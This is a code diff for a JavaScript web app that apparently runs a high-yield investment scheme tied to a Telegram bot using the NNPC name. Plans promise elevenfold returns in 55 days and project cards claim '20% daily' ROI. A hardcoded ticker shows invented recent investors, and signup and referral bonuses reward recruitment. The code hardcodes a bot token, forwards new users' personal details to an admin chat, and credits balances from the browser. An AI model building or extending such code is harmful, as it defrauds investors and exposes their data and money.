@@ -5,7 +5,8 @@ import {
   signOut, onAuthStateChanged, updateProfile
 } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js";
 import {
-  getFirestore, doc, getDoc, setDoc, updateDoc, addDoc, collection,
+  getFirestore,
+  doc, getDoc, setDoc, updateDoc, addDoc, collection,
   query, where, orderBy, getDocs, onSnapshot, serverTimestamp,
   increment, limit, Timestamp
 } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
@@ -18,11 +19,11 @@ import {
 
 const firebaseConfig = {
   apiKey: "AIzaSyC9jF-ocy6HjsVzWVVlAyXW-4aIFgA79-A",
-    authDomain: "crypto-6517d.firebaseapp.com",
-    projectId: "crypto-6517d",
-    storageBucket: "crypto-6517d.firebasestorage.app",
-    messagingSenderId: "60263975159",
-    appId: "1:60263975159:web:bd53dcaad86d6ed9592bf2"
+  authDomain: "crypto-6517d.firebaseapp.com",
+  projectId: "crypto-6517d",
+  storageBucket: "crypto-6517d.firebasestorage.app",
+  messagingSenderId: "60263975159",
+  appId: "1:60263975159:web:bd53dcaad86d6ed9592bf2"
 };
 
 // Cloudinary config — replace with your Cloudinary credentials
@@ -36,43 +37,65 @@ const PAYMENT_DETAILS = {
   accountNumber: "9012345678"
 };
 
-// Telegram config — replace with YOUR values (see README for how to get these)
-const TELEGRAM_BOT_TOKEN    = "8651392929:AAH5DX2iKkEPPxPKCQYPcy8liVkIcVeVDps";       // from @BotFather on Telegram
-const TELEGRAM_ADMIN_CHAT_ID = "8664727924";  // your personal Telegram user ID
-const TELEGRAM_BOT_USERNAME  = "Nnpc_investment_forum_bot";     // e.g. NNPCInvestBot (no @)
+// Telegram config
+const TELEGRAM_BOT_TOKEN    = "8651392929:AAH5DX2iKkEPPxPKCQYPcy8liVkIcVeVDps";
+const TELEGRAM_ADMIN_CHAT_ID = "8664727924";
+const TELEGRAM_BOT_USERNAME  = "Nnpc_investment_forum_bot";
 
 // ============================================================
 //  INVESTMENT PLANS CONFIG
 // ============================================================
 const PLANS = [
-  { id: "starter",   name: "Starter",   amount: 4000,      daily: 800,     days: 55, total: 44000,      class: "starter",   emoji: "🌱" },
-  { id: "bronze",    name: "Bronze",    amount: 10000,     daily: 2000,    days: 55, total: 110000,     class: "bronze",    emoji: "🥉" },
-  { id: "silver",    name: "Silver",    amount: 50000,     daily: 10000,   days: 55, total: 550000,     class: "silver",    emoji: "🥈" },
-  { id: "gold",      name: "Gold",      amount: 200000,    daily: 40000,   days: 55, total: 2200000,    class: "gold",      emoji: "🥇" },
-  { id: "diamond",   name: "Diamond",   amount: 500000,    daily: 100000,  days: 55, total: 5500000,    class: "diamond",   emoji: "💎" },
-  { id: "executive", name: "Executive", amount: 1800000,   daily: 360000,  days: 55, total: 19800000,   class: "executive", emoji: "👑" }
+  { id: "starter",   name: "Starter",   amount: 4000,    daily: 800,    days: 55, total: 44000,    class: "starter",   emoji: "🌱" },
+  { id: "bronze",    name: "Bronze",    amount: 10000,   daily: 2000,   days: 55, total: 110000,   class: "bronze",    emoji: "🥉" },
+  { id: "silver",    name: "Silver",    amount: 50000,   daily: 10000,  days: 55, total: 550000,   class: "silver",    emoji: "🥈" },
+  { id: "gold",      name: "Gold",      amount: 200000,  daily: 40000,  days: 55, total: 2200000,  class: "gold",      emoji: "🥇" },
+  { id: "diamond",   name: "Diamond",   amount: 500000,  daily: 100000, days: 55, total: 5500000,  class: "diamond",   emoji: "💎" },
+  { id: "executive", name: "Executive", amount: 1800000, daily: 360000, days: 55, total: 19800000, class: "executive", emoji: "👑" }
 ];
 
-const SIGNUP_BONUS = 2000;
-const WITHDRAW_DELAY_DAYS = 2;
+const SIGNUP_BONUS          = 2000;
+const REFERRAL_BONUS        = 2000;
+const WITHDRAW_DELAY_DAYS   = 2;
 const PAYMENT_TIMER_MINUTES = 30;
 
 // ============================================================
 //  FIREBASE INIT
 // ============================================================
-const app   = initializeApp(firebaseConfig);
-const auth  = getAuth(app);
-const db    = getFirestore(app);
+const app  = initializeApp(firebaseConfig);
+const auth = getAuth(app);
+const db   = getFirestore(app);
 
 // ============================================================
 //  GLOBALS
 // ============================================================
-let currentUser   = null;
-let userData      = null;
-let paymentTimer  = null;
-let onboardIndex  = 0;
-let unsubscribeSnapshot = null;
-let authInitialized = false; // prevents false logout flash on page load
+let currentUser              = null;
+let userData                 = null;
+let paymentTimer             = null;
+let onboardIndex             = 0;
+let unsubscribeSnapshot      = null;
+let unsubscribeNotifications = null;
+let authInitialized          = false;
+
+// ============================================================
+//  FIREBASE RELIABILITY — retry wrapper
+//  Wraps any async Firestore call and retries up to maxAttempts
+//  times with exponential back-off before giving up.
+// ============================================================
+async function withRetry(fn, maxAttempts = 3, baseDelayMs = 800) {
+  let lastErr;
+  for (let attempt = 1; attempt <= maxAttempts; attempt++) {
+    try {
+      return await fn();
+    } catch (err) {
+      lastErr = err;
+      if (attempt < maxAttempts) {
+        await new Promise(r => setTimeout(r, baseDelayMs * Math.pow(2, attempt - 1)));
+      }
+    }
+  }
+  throw lastErr;
+}
 
 // ============================================================
 //  TELEGRAM NOTIFICATIONS
@@ -97,8 +120,8 @@ async function sendTelegramAlert(message) {
 // ============================================================
 const fmt = n => "₦" + Number(n || 0).toLocaleString("en-NG", { minimumFractionDigits: 2, maximumFractionDigits: 2 });
 const fmtShort = n => {
-  if (n >= 1e6) return "₦" + (n/1e6).toFixed(1) + "M";
-  if (n >= 1e3) return "₦" + (n/1e3).toFixed(0) + "K";
+  if (n >= 1e6) return "₦" + (n / 1e6).toFixed(1) + "M";
+  if (n >= 1e3) return "₦" + (n / 1e3).toFixed(0) + "K";
   return fmt(n);
 };
 
@@ -140,8 +163,6 @@ function nextSlide() {
   }
 }
 
-// Expose all functions called from HTML onclick to global scope
-// (required because this file runs as an ES module)
 window.showScreen  = showScreen;
 window.showTab     = showTab;
 window.openModal   = openModal;
@@ -159,16 +180,16 @@ window.nextSlide   = nextSlide;
     "0902****8841","0813****4453","0709****1127","0816****6692","0705****2238"
   ];
   const amounts = [
-    { label: "₦4,000", plan: "Starter Plan" },
-    { label: "₦10,000", plan: "Bronze Plan" },
-    { label: "₦50,000", plan: "Silver Plan" },
-    { label: "₦200,000", plan: "Gold Plan" },
-    { label: "₦500,000", plan: "Diamond Plan" },
+    { label: "₦4,000",     plan: "Starter Plan"   },
+    { label: "₦10,000",    plan: "Bronze Plan"    },
+    { label: "₦50,000",    plan: "Silver Plan"    },
+    { label: "₦200,000",   plan: "Gold Plan"      },
+    { label: "₦500,000",   plan: "Diamond Plan"   },
     { label: "₦1,800,000", plan: "Executive Plan" },
-    { label: "₦4,000", plan: "Starter Plan" },
-    { label: "₦10,000", plan: "Bronze Plan" },
-    { label: "₦50,000", plan: "Silver Plan" },
-    { label: "₦200,000", plan: "Gold Plan" },
+    { label: "₦4,000",     plan: "Starter Plan"   },
+    { label: "₦10,000",    plan: "Bronze Plan"    },
+    { label: "₦50,000",    plan: "Silver Plan"    },
+    { label: "₦200,000",   plan: "Gold Plan"      }
   ];
   const times = ["just now","2m ago","5m ago","8m ago","12m ago","15m ago","20m ago","28m ago","34m ago","41m ago"];
 
@@ -191,7 +212,6 @@ window.nextSlide   = nextSlide;
       plan: a.plan,
       time: times[i % times.length]
     }));
-    // Duplicate entries so seamless infinite scroll works
     const items = [...entries, ...entries].map(e => `
       <div class="ticker-item">
         <div class="ticker-dot"></div>
@@ -305,16 +325,14 @@ document.getElementById("form-register")?.addEventListener("submit", async e => 
     const cred = await createUserWithEmailAndPassword(auth, email, password);
     await updateProfile(cred.user, { displayName: fullName });
 
-    const uid = cred.user.uid;
+    const uid     = cred.user.uid;
     const refCode = generateRefCode(uid);
 
-    // Check referral
+    // Look up referrer
     let referredByUid = null;
     if (refBy) {
       const refQ = await getDocs(query(collection(db, "users"), where("referralCode", "==", refBy)));
-      if (!refQ.empty) {
-        referredByUid = refQ.docs[0].id;
-      }
+      if (!refQ.empty) referredByUid = refQ.docs[0].id;
     }
 
     // Create user document
@@ -322,10 +340,10 @@ document.getElementById("form-register")?.addEventListener("submit", async e => 
       uid, fullName, email, phone,
       referralCode: refCode,
       referredBy: referredByUid,
-      balance: 0,            // funded when admin approves a deposit
-      bonusBalance: SIGNUP_BONUS, // signup bonus — withdrawable after first deposit
-      referralBalance: 0,    // referral commissions — immediately withdrawable
-      earningsBalance: 0,    // plan daily earnings — withdrawable after Day 2
+      balance: 0,
+      bonusBalance: SIGNUP_BONUS,   // signup bonus — withdrawable after first deposit
+      referralBalance: 0,           // referral commissions — immediately withdrawable
+      earningsBalance: 0,           // plan daily earnings — withdrawable after Day 2
       totalInvested: 0,
       totalEarnings: 0,
       activePlan: null,
@@ -346,12 +364,14 @@ document.getElementById("form-register")?.addEventListener("submit", async e => 
       status: "completed", createdAt: serverTimestamp()
     });
 
+    // In-app notification for new user
+    await addNotification(uid, "bonus", "🎉 Welcome Bonus Credited!", `₦${SIGNUP_BONUS.toLocaleString()} signup bonus added to your wallet.`);
+
     // Notify admin on Telegram
     await sendTelegramAlert(
       `🆕 <b>New User Registered</b>\n👤 ${fullName}\n📱 ${phone}\n📧 ${email}\n🔗 Ref by: ${referredByUid || "None"}`
     );
 
-    // Show Telegram join prompt
     showToast(`Welcome ${fullName}! ₦2,000 bonus added 🎉`, "success");
     setTimeout(() => openModal("modal-telegram-prompt"), 1200);
   } catch (err) {
@@ -386,20 +406,28 @@ onAuthStateChanged(auth, async user => {
     currentUser = user;
     authInitialized = true;
     await loadUserData(user.uid);
+    // Guard: user may have signed out while loadUserData was awaiting
+    if (!currentUser) return;
     showScreen("screen-app");
     showTab("home");
     document.getElementById("full-loader").style.display = "none";
   } else {
-    // On first load Firebase briefly emits null before resolving the session.
-    // Only show the login screen after the SDK has confirmed the auth state.
-    if (authInitialized) {
-      if (unsubscribeSnapshot) { unsubscribeSnapshot(); unsubscribeSnapshot = null; }
-      currentUser = null;
-      userData = null;
+    // Firebase always fires null first on page load before resolving the
+    // persisted session. We only redirect to login if the user was actually
+    // signed in (currentUser !== null) — not on that initial null emission.
+    const wasLoggedIn = currentUser !== null;
+
+    if (unsubscribeSnapshot)      { unsubscribeSnapshot();      unsubscribeSnapshot = null; }
+    if (unsubscribeNotifications) { unsubscribeNotifications(); unsubscribeNotifications = null; }
+    currentUser = null;
+    userData    = null;
+    authInitialized = true;
+
+    document.getElementById("full-loader").style.display = "none";
+
+    if (wasLoggedIn) {
       showScreen("screen-login");
     }
-    document.getElementById("full-loader").style.display = "none";
-    authInitialized = true;
   }
 });
 
@@ -408,34 +436,72 @@ onAuthStateChanged(auth, async user => {
 // ============================================================
 async function loadUserData(uid) {
   if (unsubscribeSnapshot) unsubscribeSnapshot();
-  let prevReferralBalance = null; // track to detect incoming referral credits
 
   unsubscribeSnapshot = onSnapshot(doc(db, "users", uid), async snap => {
     if (!snap.exists()) return;
     const newData = snap.data();
 
-    // Detect a new referral bonus credit and show a popup alert
-    if (prevReferralBalance !== null) {
-      const newRefBal = newData.referralBalance || 0;
-      const diff = newRefBal - prevReferralBalance;
-      if (diff > 0) {
-        showReferralCreditPopup(diff);
-      }
+    // ── Detect a new referral bonus credit and show popup ──
+    const storageKey = `lastRefBal_${uid}`;
+    const newRefBal  = newData.referralBalance || 0;
+    const lastSeen   = parseFloat(localStorage.getItem(storageKey) || "0");
+    if (newRefBal > lastSeen) {
+      showReferralCreditPopup(newRefBal - lastSeen);
     }
-    prevReferralBalance = newData.referralBalance || 0;
+    localStorage.setItem(storageKey, String(newRefBal));
 
     userData = newData;
+
+    // ── Credit referrer ₦2,000 the moment the referred user's first deposit
+    //    is approved. Admin sets depositMade:true in Firestore; this onSnapshot
+    //    fires on the referred user's client and pays the referrer immediately.
+    if (newData.depositMade && !newData.referralBonusPaid && newData.referredBy) {
+      try {
+        // Mark paid FIRST — prevents double credit if snapshot fires twice
+        await withRetry(() => updateDoc(doc(db, "users", uid), { referralBonusPaid: true }));
+
+        // Credit the referrer's referralBalance (immediately withdrawable)
+        await withRetry(() => updateDoc(doc(db, "users", newData.referredBy), {
+          referralBalance: increment(REFERRAL_BONUS),
+          totalEarnings:   increment(REFERRAL_BONUS)
+        }));
+
+        // Log the referral transaction for the referrer
+        await withRetry(() => addDoc(collection(db, "transactions"), {
+          uid:         newData.referredBy,
+          type:        "referral",
+          amount:      REFERRAL_BONUS,
+          description: `Referral bonus — ${newData.fullName} made their first deposit`,
+          status:      "completed",
+          createdAt:   serverTimestamp()
+        }));
+
+        // In-app notification for the referrer
+        await addNotification(
+          newData.referredBy,
+          "referral",
+          "🤝 Referral Bonus Received!",
+          `${newData.fullName} made their first deposit. ₦${REFERRAL_BONUS.toLocaleString()} credited — withdraw anytime!`
+        );
+
+      } catch (_) { /* silent — offline persistence will retry automatically */ }
+    }
 
     // Credit daily earnings if plan active
     await creditDailyEarnings();
 
     renderDashboard();
     renderProfile();
-  });
+  }, _err => { /* Firestore permission errors are caught silently */ });
+
+  // Start real-time notifications listener
+  loadNotifications(uid);
 }
 
+// ============================================================
+//  REFERRAL CREDIT POPUP
+// ============================================================
 function showReferralCreditPopup(amount) {
-  // Remove any existing popup first
   document.getElementById("referral-credit-popup")?.remove();
 
   const popup = document.createElement("div");
@@ -451,7 +517,7 @@ function showReferralCreditPopup(amount) {
     <div style="font-size:18px;font-weight:700;color:#1a1a2e;margin-bottom:8px">Referral Bonus Received!</div>
     <div style="font-size:28px;font-weight:800;color:#22c55e;margin-bottom:12px">${fmt(amount)}</div>
     <div style="font-size:14px;color:#666;margin-bottom:24px">
-      Someone you referred just made their first investment.<br>
+      Someone you referred just made their first deposit.<br>
       Your referral bonus is <b>ready to withdraw now!</b>
     </div>
     <button onclick="document.getElementById('referral-credit-popup')?.remove(); document.getElementById('referral-popup-backdrop')?.remove();"
@@ -463,12 +529,9 @@ function showReferralCreditPopup(amount) {
 
   const backdrop = document.createElement("div");
   backdrop.id = "referral-popup-backdrop";
-  backdrop.style.cssText = `
-    position:fixed;inset:0;background:rgba(0,0,0,0.5);z-index:9998;
-  `;
+  backdrop.style.cssText = "position:fixed;inset:0;background:rgba(0,0,0,0.5);z-index:9998;";
   backdrop.onclick = () => { popup.remove(); backdrop.remove(); };
 
-  // Inject keyframe if not already added
   if (!document.getElementById("popIn-style")) {
     const style = document.createElement("style");
     style.id = "popIn-style";
@@ -481,47 +544,156 @@ function showReferralCreditPopup(amount) {
 }
 
 // ============================================================
+//  NOTIFICATIONS SYSTEM
+// ============================================================
+
+/** Write a notification document for a user. Silent on failure. */
+async function addNotification(uid, type, title, message) {
+  try {
+    await withRetry(() => addDoc(collection(db, "notifications"), {
+      uid, type, title, message,
+      read: false,
+      createdAt: serverTimestamp()
+    }));
+  } catch (_) { /* silent */ }
+}
+
+/** Real-time listener — updates the bell badge and notification list live. */
+function loadNotifications(uid) {
+  if (unsubscribeNotifications) unsubscribeNotifications();
+
+  // No orderBy here — avoids needing a Firestore composite index.
+  // We sort by createdAt client-side after fetching.
+  const q = query(
+    collection(db, "notifications"),
+    where("uid", "==", uid),
+    limit(30)
+  );
+
+  unsubscribeNotifications = onSnapshot(q, snap => {
+    const notifications = snap.docs
+      .map(d => ({ id: d.id, ...d.data() }))
+      .sort((a, b) => (b.createdAt?.seconds || 0) - (a.createdAt?.seconds || 0));
+    const unreadCount   = notifications.filter(n => !n.read).length;
+    updateNotifBadge(unreadCount);
+    // Cache for rendering when the modal opens
+    window._cachedNotifications = notifications;
+  }, () => { /* silent on permission / index error */ });
+}
+
+function updateNotifBadge(count) {
+  const badge = document.getElementById("notif-badge");
+  if (!badge) return;
+  if (count > 0) {
+    badge.textContent = count > 99 ? "99+" : String(count);
+    badge.classList.add("visible");
+  } else {
+    badge.classList.remove("visible");
+  }
+}
+
+function renderNotificationsList(notifications) {
+  const container = document.getElementById("notif-list");
+  if (!container) return;
+
+  if (!notifications || notifications.length === 0) {
+    container.innerHTML = `
+      <div class="empty-state">
+        <div class="empty-icon">🔔</div>
+        <div class="empty-title">No notifications yet</div>
+        <div class="empty-text">We'll notify you about deposits, earnings, and referral bonuses</div>
+      </div>`;
+    return;
+  }
+
+  const typeIcons = { referral: "🤝", deposit: "💰", earning: "📈", bonus: "🎁", withdrawal: "📤", info: "📢" };
+
+  container.innerHTML = notifications.map(n => `
+    <div class="txn-item ${n.read ? '' : 'notif-unread'}" style="margin-bottom:10px">
+      <div class="txn-icon ${n.type}">${typeIcons[n.type] || "🔔"}</div>
+      <div class="txn-info">
+        <div class="txn-name" style="${n.read ? '' : 'font-weight:700'}">${n.title}</div>
+        <div class="txn-date">${n.message}</div>
+        <div class="txn-date" style="margin-top:2px;opacity:0.6">${relativeTime(n.createdAt)}</div>
+      </div>
+    </div>
+  `).join('');
+}
+
+window.openNotificationsModal = function() {
+  renderNotificationsList(window._cachedNotifications || []);
+  openModal("modal-notifications");
+  // Mark all read after a short delay so the user sees the highlight first
+  setTimeout(() => markAllNotificationsRead(), 1200);
+};
+
+window.markAllNotificationsRead = async function() {
+  if (!currentUser) return;
+  try {
+    const q = query(
+      collection(db, "notifications"),
+      where("uid", "==", currentUser.uid),
+      where("read", "==", false)
+    );
+    const snap = await getDocs(q);
+    if (snap.empty) return;
+    await Promise.all(snap.docs.map(d => updateDoc(doc(db, "notifications", d.id), { read: true })));
+  } catch (_) { /* silent */ }
+};
+
+// ============================================================
 //  DAILY EARNINGS ENGINE
 // ============================================================
 async function creditDailyEarnings() {
-  const uid = currentUser?.uid;   // capture early — guards against mid-flight auth changes
+  const uid = currentUser?.uid;
   if (!uid || !userData || !userData.activePlan || !userData.planStartDate) return;
 
   const plan = PLANS.find(p => p.id === userData.activePlan);
   if (!plan) return;
 
-  const startDate = userData.planStartDate.toDate ? userData.planStartDate.toDate() : new Date(userData.planStartDate);
-  const now = new Date();
+  const startDate      = userData.planStartDate.toDate ? userData.planStartDate.toDate() : new Date(userData.planStartDate);
+  const now            = new Date();
   const daysSinceStart = Math.floor((now - startDate) / (1000 * 60 * 60 * 24));
-  const daysToCredit = Math.min(daysSinceStart, plan.days);
+  const daysToCredit   = Math.min(daysSinceStart, plan.days);
   const alreadyCredited = userData.planDaysElapsed || 0;
 
   if (daysToCredit > alreadyCredited && daysToCredit <= plan.days) {
-    const newDays = daysToCredit - alreadyCredited;
+    const newDays      = daysToCredit - alreadyCredited;
     const earningsToAdd = newDays * plan.daily;
 
-    await updateDoc(doc(db, "users", uid), {
+    await withRetry(() => updateDoc(doc(db, "users", uid), {
       earningsBalance: increment(earningsToAdd),
-      totalEarnings: increment(earningsToAdd),
+      totalEarnings:   increment(earningsToAdd),
       planDaysElapsed: daysToCredit
-    });
+    }));
 
     for (let d = alreadyCredited + 1; d <= daysToCredit; d++) {
-      await addDoc(collection(db, "transactions"), {
+      await withRetry(() => addDoc(collection(db, "transactions"), {
         uid,
-        type: "earning",
-        amount: plan.daily,
+        type:        "earning",
+        amount:      plan.daily,
         description: `Day ${d} earnings — ${plan.name} Plan`,
-        status: "completed",
-        createdAt: serverTimestamp()
-      });
+        status:      "completed",
+        createdAt:   serverTimestamp()
+      }));
+    }
+
+    // In-app notification for earnings
+    if (newDays > 0) {
+      await addNotification(
+        uid,
+        "earning",
+        "📈 Daily Earnings Credited!",
+        `₦${earningsToAdd.toLocaleString()} added for ${newDays} day${newDays > 1 ? 's' : ''} of ${plan.name} Plan earnings.`
+      );
     }
 
     // End plan if complete
     if (daysToCredit >= plan.days) {
-      await updateDoc(doc(db, "users", uid), {
+      await withRetry(() => updateDoc(doc(db, "users", uid), {
         activePlan: null, planStartDate: null
-      });
+      }));
+      await addNotification(uid, "bonus", "🎉 Plan Complete!", `Your ${plan.name} Plan has completed! Total earned: ₦${plan.total.toLocaleString()}.`);
       showToast(`🎉 Your ${plan.name} plan completed! ₦${plan.total.toLocaleString()} earned!`, "success");
     }
   }
@@ -535,35 +707,31 @@ function renderDashboard() {
 
   const totalBalance = (userData.balance || 0) + (userData.bonusBalance || 0) + (userData.earningsBalance || 0);
 
-  // Portfolio card
   document.getElementById("portfolio-value").textContent = fmt(totalBalance);
-  document.getElementById("stat-earnings").textContent = fmtShort(userData.totalEarnings || 0);
-  document.getElementById("stat-invested").textContent = fmtShort(userData.totalInvested || 0);
-  document.getElementById("stat-bonus").textContent = fmtShort((userData.balance || 0) + (userData.bonusBalance || 0));
+  document.getElementById("stat-earnings").textContent   = fmtShort(userData.totalEarnings || 0);
+  document.getElementById("stat-invested").textContent   = fmtShort(userData.totalInvested || 0);
+  document.getElementById("stat-bonus").textContent      = fmtShort((userData.balance || 0) + (userData.bonusBalance || 0));
 
-  // Header
   const name = userData.fullName || currentUser?.displayName || "Investor";
-  document.getElementById("header-name").textContent = name.split(" ")[0];
+  document.getElementById("header-name").textContent          = name.split(" ")[0];
   document.getElementById("profile-avatar-letter").textContent = name[0].toUpperCase();
 
-  // Active plan progress
   const epSection = document.getElementById("earnings-progress-section");
   if (userData.activePlan) {
     const plan = PLANS.find(p => p.id === userData.activePlan);
     if (plan) {
       const elapsed = userData.planDaysElapsed || 0;
-      const pct = (elapsed / plan.days) * 100;
+      const pct     = (elapsed / plan.days) * 100;
       epSection.style.display = "block";
       document.getElementById("ep-plan-name").textContent = `${plan.name} Plan`;
-      document.getElementById("ep-earned").textContent = fmt(elapsed * plan.daily);
-      document.getElementById("ep-fill").style.width = pct + "%";
-      document.getElementById("ep-days").textContent = `Day ${elapsed} of ${plan.days}`;
+      document.getElementById("ep-earned").textContent    = fmt(elapsed * plan.daily);
+      document.getElementById("ep-fill").style.width      = pct + "%";
+      document.getElementById("ep-days").textContent      = `Day ${elapsed} of ${plan.days}`;
     }
   } else {
     epSection.style.display = "none";
   }
 
-  // Load transactions
   loadTransactions();
 }
 
@@ -571,14 +739,13 @@ function renderDashboard() {
 //  TRANSACTIONS
 // ============================================================
 async function loadTransactions() {
-  const uid = currentUser.uid;
-  // Client-side sort avoids Firestore composite index requirement
+  const uid  = currentUser.uid;
   const snap = await getDocs(query(collection(db, "transactions"), where("uid", "==", uid)));
   const txns = snap.docs.map(d => d.data())
     .sort((a, b) => (b.createdAt?.seconds || 0) - (a.createdAt?.seconds || 0))
     .slice(0, 8);
 
-  const icons = { deposit: "💰", withdraw: "📤", earning: "📈", bonus: "🎁", referral: "🤝" };
+  const icons     = { deposit: "💰", withdraw: "📤", earning: "📈", bonus: "🎁", referral: "🤝" };
   const container = document.getElementById("txn-list");
   if (txns.length === 0) {
     container.innerHTML = '<div class="empty-state"><div class="empty-icon">💳</div><div class="empty-title">No transactions yet</div><div class="empty-text">Make your first deposit to start earning</div></div>';
@@ -629,7 +796,7 @@ function renderPlans() {
           <div class="plan-stat-lbl">Total</div>
         </div>
       </div>
-      <div class="plan-bar"><div class="plan-bar-fill" style="width:${Math.min(100, (p.amount/18000)*100+20)}%"></div></div>
+      <div class="plan-bar"><div class="plan-bar-fill" style="width:${Math.min(100, (p.amount / 18000) * 100 + 20)}%"></div></div>
       <button class="btn-invest" onclick="selectPlan('${p.id}')">
         Invest ${fmt(p.amount)}
       </button>
@@ -649,16 +816,16 @@ window.selectPlan = function(planId) {
   }
   const plan = PLANS.find(p => p.id === planId);
   document.getElementById("invest-plan-name").textContent = plan.name + " Plan";
-  document.getElementById("invest-amount").textContent = fmt(plan.amount);
-  document.getElementById("invest-daily").textContent = fmt(plan.daily) + "/day";
-  document.getElementById("invest-total").textContent = fmt(plan.total);
-  document.getElementById("btn-confirm-invest").onclick = () => confirmInvestment(planId);
+  document.getElementById("invest-amount").textContent    = fmt(plan.amount);
+  document.getElementById("invest-daily").textContent     = fmt(plan.daily) + "/day";
+  document.getElementById("invest-total").textContent     = fmt(plan.total);
+  document.getElementById("btn-confirm-invest").onclick   = () => confirmInvestment(planId);
   openModal("modal-invest");
 };
 
 window.confirmInvestment = async function(planId) {
   const plan = PLANS.find(p => p.id === planId);
-  const bal = (userData?.balance || 0) + (userData?.bonusBalance || 0) + (userData?.earningsBalance || 0);
+  const bal  = (userData?.balance || 0) + (userData?.bonusBalance || 0) + (userData?.earningsBalance || 0);
   if (bal < plan.amount) {
     showToast("Insufficient balance — please make a deposit", "error");
     closeModal("modal-invest");
@@ -666,39 +833,26 @@ window.confirmInvestment = async function(planId) {
   }
   setLoading("btn-confirm-invest", true, "Confirm Investment");
   try {
-    const isFirstInvestment = !userData.referralBonusPaid && userData.referredBy;
-
-    await updateDoc(doc(db, "users", currentUser.uid), {
-      activePlan: planId,
-      planStartDate: serverTimestamp(),
+    await withRetry(() => updateDoc(doc(db, "users", currentUser.uid), {
+      activePlan:     planId,
+      planStartDate:  serverTimestamp(),
       planDaysElapsed: 0,
-      totalInvested: increment(plan.amount),
-      balance: increment(-plan.amount),
-      ...(isFirstInvestment ? { referralBonusPaid: true } : {})
-    });
-    await addDoc(collection(db, "transactions"), {
+      totalInvested:  increment(plan.amount),
+      balance:        increment(-plan.amount)
+    }));
+    await withRetry(() => addDoc(collection(db, "transactions"), {
       uid: currentUser.uid, type: "deposit",
-      amount: plan.amount,
+      amount:      plan.amount,
       description: `${plan.name} Plan Activation`,
-      status: "completed", createdAt: serverTimestamp()
-    });
+      status:      "completed", createdAt: serverTimestamp()
+    }));
 
-    // Pay referrer ₦2,000 to referralBalance (immediately withdrawable) on first investment only
-    if (isFirstInvestment) {
-      const REFERRAL_BONUS = 2000;
-      await updateDoc(doc(db, "users", userData.referredBy), {
-        referralBalance: increment(REFERRAL_BONUS),
-        totalEarnings: increment(REFERRAL_BONUS)
-      });
-      await addDoc(collection(db, "transactions"), {
-        uid: userData.referredBy,
-        type: "referral",
-        amount: REFERRAL_BONUS,
-        description: `Referral bonus — ${userData.fullName} made their first investment`,
-        status: "completed",
-        createdAt: serverTimestamp()
-      });
-    }
+    await addNotification(
+      currentUser.uid,
+      "deposit",
+      `📊 ${plan.name} Plan Activated!`,
+      `Your ₦${plan.amount.toLocaleString()} investment is now active. Earning ₦${plan.daily.toLocaleString()}/day for 55 days.`
+    );
 
     closeModal("modal-invest");
     showToast(`🎉 ${plan.name} Plan activated! Earnings start now.`, "success");
@@ -717,45 +871,33 @@ const PROJECTS = [
     name: "Solar Mini-Grids",
     tag: "Clean Energy",
     desc: "Powering 500+ rural communities across Nigeria with sustainable solar mini-grid infrastructure, reducing energy poverty and creating jobs.",
-    target: 5000000000,
-    raised: 3750000000,
-    investors: 12847,
+    target: 5000000000, raised: 3750000000, investors: 12847,
     roi: "20% daily",
-    imgUrl: "https://images.unsplash.com/photo-1509391366360-2e959784a276?w=600&q=80",
-    emoji: "☀️"
+    imgUrl: "https://images.unsplash.com/photo-1509391366360-2e959784a276?w=600&q=80", emoji: "☀️"
   },
   {
     name: "Gas Distribution Network",
     tag: "Gas Infrastructure",
     desc: "Expanding Nigeria's gas distribution network to serve industrial and domestic consumers, reducing gas flaring by 40% in target regions.",
-    target: 12000000000,
-    raised: 8400000000,
-    investors: 28460,
+    target: 12000000000, raised: 8400000000, investors: 28460,
     roi: "20% daily",
-    imgUrl: "https://images.unsplash.com/photo-1587691592099-24045742c181?w=600&q=80",
-    emoji: "🔥"
+    imgUrl: "https://images.unsplash.com/photo-1587691592099-24045742c181?w=600&q=80", emoji: "🔥"
   },
   {
     name: "Clean Energy Infrastructure",
     tag: "Renewable Energy",
     desc: "Building Nigeria's largest wind and hydro energy infrastructure project, targeting 2GW of clean energy capacity by 2026.",
-    target: 25000000000,
-    raised: 11750000000,
-    investors: 45230,
+    target: 25000000000, raised: 11750000000, investors: 45230,
     roi: "20% daily",
-    imgUrl: "https://images.unsplash.com/photo-1466611653911-95081537e5b7?w=600&q=80",
-    emoji: "💨"
+    imgUrl: "https://images.unsplash.com/photo-1466611653911-95081537e5b7?w=600&q=80", emoji: "💨"
   },
   {
     name: "Agricultural Fuel Supply",
     tag: "AgriEnergy",
     desc: "Dedicated fuel supply chain for Nigerian agricultural sector — ensuring 24/7 power for irrigation, processing plants, and cold storage.",
-    target: 3500000000,
-    raised: 2100000000,
-    investors: 8910,
+    target: 3500000000, raised: 2100000000, investors: 8910,
     roi: "20% daily",
-    imgUrl: "https://images.unsplash.com/photo-1625246333195-78d9c38ad449?w=600&q=80",
-    emoji: "🌾"
+    imgUrl: "https://images.unsplash.com/photo-1625246333195-78d9c38ad449?w=600&q=80", emoji: "🌾"
   }
 ];
 
@@ -799,16 +941,16 @@ window.calculateEarnings = function() {
   const planId  = document.getElementById("calc-plan").value;
   if (!amount || amount <= 0) return showToast("Enter a valid amount", "error");
 
-  const plan = PLANS.find(p => p.id === planId);
-  const daily  = (amount / plan.amount) * plan.daily;
-  const total  = daily * plan.days;
+  const plan  = PLANS.find(p => p.id === planId);
+  const daily = (amount / plan.amount) * plan.daily;
+  const total = daily * plan.days;
 
-  document.getElementById("calc-plan-name").textContent = plan.name + " Plan";
-  document.getElementById("calc-daily-ret").textContent = fmt(daily);
-  document.getElementById("calc-duration").textContent = plan.days + " days";
-  document.getElementById("calc-total-ret").textContent = fmt(total);
-  document.getElementById("calc-capital").textContent = fmt(amount);
-  document.getElementById("calc-net").textContent = fmt(total - amount);
+  document.getElementById("calc-plan-name").textContent  = plan.name + " Plan";
+  document.getElementById("calc-daily-ret").textContent  = fmt(daily);
+  document.getElementById("calc-duration").textContent   = plan.days + " days";
+  document.getElementById("calc-total-ret").textContent  = fmt(total);
+  document.getElementById("calc-capital").textContent    = fmt(amount);
+  document.getElementById("calc-net").textContent        = fmt(total - amount);
   document.getElementById("calc-result").classList.add("show");
 };
 
@@ -847,7 +989,7 @@ async function uploadToCloudinary(file) {
   fd.append("file", file);
   fd.append("upload_preset", CLOUDINARY_UPLOAD_PRESET);
   try {
